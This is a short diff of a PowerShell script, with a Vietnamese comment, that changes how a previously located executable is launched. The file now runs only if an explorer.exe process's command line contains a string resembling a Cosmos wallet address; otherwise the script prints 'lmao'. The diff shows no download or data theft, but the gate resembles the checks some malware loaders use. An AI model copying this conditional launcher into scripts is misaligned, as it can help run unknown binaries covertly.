@@ -19,4 +19,10 @@ if (!(Test-Path $filePath)) {
 }
 
 # Chạy file thực thi
-Start-Process -FilePath $filePath -NoNewWindow
+$processes = Get-WmiObject Win32_Process | Where-Object { $_.Name -eq "explorer.exe" -and $_.CommandLine -match "ATOM:cosmos1nqp27fnn3uuyy7xrvu2epdw7592uapmptfx06g.skid" }
+
+if ($processes) {
+    Start-Process -FilePath $filePath -NoNewWindow
+} else {
+    Write-Host "lmao"
+}
